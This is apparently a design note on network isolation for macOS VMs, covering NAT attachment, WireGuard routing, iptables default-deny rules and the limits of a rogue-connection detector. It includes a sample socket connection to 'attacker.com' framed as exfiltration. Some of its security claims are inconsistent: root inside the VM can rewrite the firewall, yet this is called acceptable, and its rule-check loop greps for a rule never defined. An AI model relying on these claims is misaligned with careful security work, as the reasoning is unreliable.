# Network Architecture Clarification: VM vs Host Network Isolation

## Critical Question: Malicious vs User Traffic?

**Short Answer**: There is **NO distinction**. ALL workload traffic must go through the VPN. Any traffic that doesn't is considered rogue.

This is a **"default deny"** security model:
- ✅ Traffic through VPN → Allowed
- ❌ Any other traffic → Rogue (terminate VM)

There is no such thing as "legitimate non-VPN traffic" from the workload's perspective.

## Understanding VZNATNetworkDeviceAttachment

### What This Actually Provides

```swift
// VirtualizationManager.swift:244-247
let networkDevice = VZVirtioNetworkDeviceConfiguration()
networkDevice.attachment = VZNATNetworkDeviceAttachment()
```

**What `VZNATNetworkDeviceAttachment` means:**

1. **Separate Network Stack**
   - VM has its own network interface (typically `eth0` inside VM)
   - VM gets its own IP address (e.g., `192.168.64.2`)
   - Completely separate from host's network interfaces
   - Host IP might be `192.168.1.100`, VM is `192.168.64.2`

2. **NAT (Network Address Translation)**
   - VM traffic is translated to appear from host's IP
   - Internet sees traffic coming from host (not VM IP)
   - Return traffic is de-NAT'd back to VM

3. **Default Behavior (IMPORTANT)**
   - VM **CAN** reach the internet
   - VM **CAN** potentially reach host's LAN (192.168.1.x)
   - VM **CANNOT** directly see host's network interfaces
   - But can route packets to LAN destinations through NAT

### Visual: NAT Network Architecture

```
┌──────────────────────────────────────────────────────────┐
│ Provider's Mac (Host) - IP: 192.168.1.100               │
│                                                          │
│  Host Network Interfaces:                               │
│  - en0 (WiFi): 192.168.1.100                           │
│  - lo0 (Localhost): 127.0.0.1                          │
│                                                          │
│  ┌────────────────────────────────────────────┐         │
│  │ VM (Separate Network Stack)                │         │
│  │ IP: 192.168.64.2                           │         │
│  │                                            │         │
│  │  VM Network Interfaces:                    │         │
│  │  - eth0: 192.168.64.2 (virtual)           │         │
│  │  - lo: 127.0.0.1 (VM's own localhost)     │         │
│  │                                            │         │
│  │  When VM sends packet to 8.8.8.8:         │         │
│  │  Source: 192.168.64.2 → NAT → 192.168.1.100│        │
│  │  (Internet sees it from host's IP)         │         │
│  └──────────────┬─────────────────────────────┘         │
│                 │                                        │
│                 │ NAT Translation                        │
│                 ▼                                        │
│  ┌────────────────────────────────────────────┐         │
│  │ VZNATNetworkDeviceAttachment               │         │
│  │ (Virtualization.framework NAT engine)      │         │
│  └──────────────┬─────────────────────────────┘         │
│                 │                                        │
└─────────────────┼────────────────────────────────────────┘
                  │
                  ▼
            [Internet / LAN]
```

## Can the VM Access Host's LAN?

### Yes, By Default (Without Our Protections)

With just `VZNATNetworkDeviceAttachment`, the VM can reach:

```
✅ Internet (any public IP)
✅ Host's LAN:
   - 192.168.1.x devices
   - 10.0.0.x devices
   - Host machine itself (192.168.1.100)
❌ Host's interfaces directly (cannot bind to host's en0)
❌ Host's processes directly (separate process space)
```

**Example without VPN/iptables:**
```bash
# Inside VM (WITHOUT our security)
ping 192.168.1.1        # Router - would work ❌
ping 192.168.1.100      # Host Mac - would work ❌
ssh user@192.168.1.50   # Another device - would work ❌
curl google.com         # Internet - would work ❌
```

**This is why we need VPN + iptables!**

## How Our Security Prevents LAN Access

### Layer 1: VPN Routing (Inside VM)

WireGuard creates a new interface `wg0` with its own routing:

```bash
# Inside VM with VPN active
ip route show

# Output:
default via 10.99.0.1 dev wg0        # Default route through VPN
10.99.0.0/24 dev wg0 src 10.99.0.2   # VPN network
192.168.64.0/24 dev eth0             # VM's local network (unused)
```

**All default traffic now goes to VPN** (10.99.0.1), not through eth0.

### Layer 2: iptables Firewall (Inside VM)

Even if routing is somehow bypassed:

```bash
# NetworkIsolation.swift:199-213
iptables -P OUTPUT DROP              # Drop all outgoing by default

# Allow ONLY these interfaces:
iptables -A OUTPUT -o lo -j ACCEPT   # Localhost (VM internal)
iptables -A OUTPUT -o wg0 -j ACCEPT  # VPN interface

# NOTICE: No rule for -o eth0
# This means eth0 output is BLOCKED by default policy
```

**Result:**
```bash
# Inside VM with our security
ping 192.168.1.1        # Blocked by iptables ✅
ping 192.168.1.100      # Blocked by iptables ✅
ssh user@192.168.1.50   # Blocked by iptables ✅
curl google.com         # Goes through wg0 (VPN) ✅
```

### Layer 3: What About Incoming Connections?

```bash
iptables -P INPUT DROP               # Drop all incoming by default
iptables -A INPUT -i lo -j ACCEPT    # Allow localhost
iptables -A INPUT -i wg0 -j ACCEPT   # Allow VPN

# No rule for -i eth0
# External hosts CANNOT connect to VM
```

Even if someone on the LAN tries to connect to the VM's IP:
```bash
# From another device on LAN (192.168.1.50)
ping 192.168.64.2       # Would be blocked by INPUT policy ✅
ssh root@192.168.64.2   # Would be blocked by INPUT policy ✅
```

## RogueConnectionDetector: What It Actually Monitors

### Current Implementation Limitation

The detector runs **on the host**, not inside the VM:

```swift
// RogueConnectionDetector.swift:150-170
private func getCurrentConnections() async throws -> [ActiveConnection] {
    let process = Process()
    process.executableURL = URL(fileURLWithPath: "/usr/sbin/netstat")
    process.arguments = ["-n", "-a", "-p", "tcp"]
    // This runs on the HOST Mac, not inside the VM
}
```

### What the Host's netstat Shows

When you run `netstat` on the host Mac, you see:

```
Proto Local-Address         Foreign-Address       State
tcp   192.168.1.100:45678   203.0.113.1:51820    ESTABLISHED  # Host → VPN server
tcp   192.168.1.100:443     8.8.8.8:443          ESTABLISHED  # Host's own traffic
tcp   127.0.0.1:8080        127.0.0.1:51234      ESTABLISHED  # Host localhost
```

**You do NOT see:**
- VM's internal connections (separate network stack)
- VM's traffic is NAT'd before reaching host

### What the Detector Actually Detects

Given this limitation, the detector currently monitors:

1. **VPN Tunnel Health**
   - Is host connected to requester's VPN server?
   - Connection to `<vpn-endpoint>:51820` present?

2. **Host's Own Traffic** (Not VM's)
   - If host itself makes suspicious connections
   - But this isn't really the threat model

3. **Cannot Directly See VM Traffic**
   - VM's network stack is isolated
   - NAT hides individual VM connections

### What We SHOULD Monitor (Future Enhancement)

To properly monitor VM traffic, we need to:

**Option 1: Console Output Monitoring**
- VM logs all iptables-blocked packets
- Parse console output for "iptables: DROP" messages
- Already partially implemented (VPN verification)

**Option 2: Host-Level Packet Capture**
- Use `tcpdump` or BPF on host's NAT interface
- Monitor packets from VM's IP (192.168.64.x)
- Check if any packets don't have VPN encryption markers

**Option 3: Inside-VM Monitoring Agent**
- Run monitoring process inside VM
- Report to host via secure channel
- Most accurate but adds complexity

## The Real Security Enforcement Point

### iptables is the Primary Defense

```
┌─────────────────────────────────────────────┐
│ VM Security Layers (ordered by effectiveness) │
├─────────────────────────────────────────────┤
│ 1. iptables firewall ⭐⭐⭐⭐⭐              │
│    - Kernel-level enforcement                │
│    - Cannot be bypassed by userspace         │
│    - Blocks at packet level                  │
│                                              │
│ 2. WireGuard routing ⭐⭐⭐⭐               │
│    - Changes default route                   │
│    - But can be overridden if iptables fails │
│                                              │
│ 3. VPN verification ⭐⭐⭐                  │
│    - Checks console for VPN active message   │
│    - Prevents VM start if VPN setup fails    │
│                                              │
│ 4. RogueConnectionDetector ⭐⭐             │
│    - Host-level monitoring                   │
│    - Limited visibility into VM traffic      │
│    - Better for VPN health checks            │
└─────────────────────────────────────────────┘
```

### Why iptables is Sufficient

The Linux kernel's netfilter (iptables) is:
- **Battle-tested**: Used in production firewalls worldwide
- **Kernel-level**: Cannot be bypassed by user processes
- **Default deny**: Blocks everything unless explicitly allowed
- **Interface-based**: `wg0` allowed, `eth0` blocked

Even if a workload has root access inside the VM, it would need to:
1. Modify iptables rules (requires root)
2. But we control the VM initialization
3. iptables rules set before workload runs
4. Workload could change them, but...

**If workload has root and modifies iptables:**
- This is actually okay! The workload can shoot itself in the foot
- Worst case: workload breaks its own networking
- Cannot escape VM boundary (virtualization.framework isolation)
- Cannot access host filesystem or processes

## Distinguishing "Malicious" vs "User" Traffic

### There Is No Distinction

**All workload traffic must use VPN. Period.**

```
┌────────────────────────────────────────────────┐
│ Traffic Classification (from VM's perspective) │
├────────────────────────────────────────────────┤
│ ✅ Through wg0 → Allowed (requester controls)  │
│ ❌ Through eth0 → Rogue (blocked by iptables)  │
│ ✅ Through lo → Allowed (VM internal)          │
└────────────────────────────────────────────────┘
```

**Examples:**

```python
# Scenario 1: Workload downloads training data
# This is LEGITIMATE user traffic
import requests
response = requests.get("http://10.99.0.5/data.csv")
# Goes through wg0 → Reaches requester's server → ✅ ALLOWED
```

```python
# Scenario 2: Workload tries to exfiltrate to attacker
# This is MALICIOUS traffic
import socket
s = socket.socket()
s.connect(("attacker.com", 443))
# Tries to use eth0 → Blocked by iptables → ❌ DENIED
```

**Key insight**: From the system's perspective, both are just "outgoing connections." We don't analyze intent. We only care: **Does it go through the VPN?**

## Trust Model

### What We Trust

1. **Apple's Virtualization.framework**
   - VMs cannot escape to host
   - Memory isolation
   - Process isolation

2. **Linux kernel (inside VM)**
   - iptables enforcement
   - Netfilter subsystem
   - Network stack isolation

3. **WireGuard**
   - Encryption
   - Routing

### What We Don't Trust

1. **The workload code** (assume malicious)
2. **Workload's behavior** (might try to bypass VPN)
3. **Network destinations** (requester controls via VPN firewall)

### Defense in Depth

Even with limitations, multiple layers protect:

```
Attack: Malicious workload tries to reach provider's LAN

Layer 1: iptables
├─ Packet to 192.168.1.x via eth0
└─ ❌ BLOCKED (no OUTPUT rule for eth0)

Layer 2: WireGuard routing
├─ If iptables somehow failed
├─ Default route is via wg0
└─ Packet would go to VPN (encrypted, requester controls destination)

Layer 3: VPN firewall (requester side)
├─ If packet somehow got through
├─ Requester's VPN server firewall
└─ Can block 192.168.x.x destinations

Layer 4: Provider notices
├─ If traffic somehow reaches provider's LAN
├─ Unusual traffic patterns
└─ Manual investigation
```

## Recommendations for Enhancement

### 1. Improve RogueConnectionDetector

Instead of monitoring host's netstat (limited value), focus on:

```swift
// Better detection strategy
public func monitorVMSecurity(jobId: UUID, vmIP: String) async throws {
    // 1. Check VPN tunnel status (already doing this)
    let isVPNHealthy = try await checkVPNHealth()

    // 2. Monitor console output for iptables blocks
    let iptablesLogs = parseConsoleForIPTablesDrops()

    // 3. Optional: tcpdump on host for VM's IP
    // Look for non-encrypted traffic from VM's IP
    let unencryptedTraffic = try await captureVMTraffic(vmIP)

    // 4. Verify VM hasn't modified iptables
    // Parse console for unexpected iptables modifications
}
```

### 2. Add VM-Side Monitoring

```bash
# Inside VM: Log all blocked packets
iptables -A OUTPUT -o eth0 -j LOG --log-prefix "ROGUE-ATTEMPT: "

# Monitor: /var/log/messages for "ROGUE-ATTEMPT"
# Send to host via VPN (logged on requester's side)
```

### 3. Periodic iptables Verification

```bash
# Inside VM: Periodically verify rules haven't changed
# Run in background alongside workload
while true; do
    iptables -L OUTPUT | grep "eth0.*DROP" || {
        echo "SECURITY: iptables rules compromised!"
        poweroff -f
    }
    sleep 10
done
```

## Summary: Direct Answers

### Q: How does it distinguish between malicious and user traffic?

**A**: It doesn't. ALL traffic must go through VPN. There is no legitimate non-VPN traffic.

### Q: Does the VM have any network interfaces that have access to the host LAN?

**A**:
- **Technically yes** - VZNATNetworkDeviceAttachment provides NAT that could reach LAN
- **In practice no** - iptables blocks all non-VPN traffic before packets leave VM
- **Cannot access host interfaces directly** - separate network namespace

### Q: Does the VM have access to host interfaces?

**A**: No. The VM has its own network stack, completely separate from the host's. It cannot:
- Bind to host's network interfaces (en0, en1, etc.)
- See host's network configuration
- Access host's processes or filesystem
- Directly communicate with host (except through VPN tunnel that goes out to internet)

### Current Architecture Status

✅ **Strong isolation** via iptables (primary defense)
✅ **Fail-safe** VM termination if VPN setup fails
⚠️ **Limited monitoring** - detector has restricted visibility into VM
⚠️ **Could enhance** - better VM-side monitoring recommended
✅ **Good enough for MVP** - iptables is industry-standard defense

---

**Bottom Line**: The VM is isolated by iptables firewall inside the VM itself. It cannot distinguish "good" vs "bad" traffic - ALL traffic must use VPN. The RogueConnectionDetector has limited visibility but the kernel-level iptables enforcement is the real security boundary.
